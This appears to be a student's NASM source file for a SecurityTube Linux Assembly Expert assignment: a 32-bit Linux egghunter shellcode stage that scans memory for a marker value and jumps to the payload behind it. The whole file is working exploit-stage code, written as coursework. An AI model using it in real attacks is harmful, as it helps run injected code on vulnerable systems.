; Filename:	egghunter.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #3 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:
	mov edi, 0x60609090	; store Egg
	xor edx, edx		; clear edx
next_page:
	or dx, 0xfff		; 4095

check_access:
	inc edx			; Increment edx to 4096 (PAGE_SIZE)
	
	;check access
	xor eax, eax		; clear eax
	mov al, 0x21		; syscall access
	lea ebx, [edx+0x4]	; load 8 bytes to EBX to test access
	int 0x80		; execute syscall
	cmp al, 0xf2		; check for EFAULT error code
	je next_page		; if 0 then we've hit inaccessible memory, move to the next page 

	; check bytes
	cmp [edx], edi		; check for first part of egg
	jne check_access	; if not egg move onto next 8 bytes
	cmp [edx+0x4], edi	; check for second part of egg
	jne check_access	; if not egg move onto next 8 bytes
	
	jmp edx			; found egg, jump to it
	
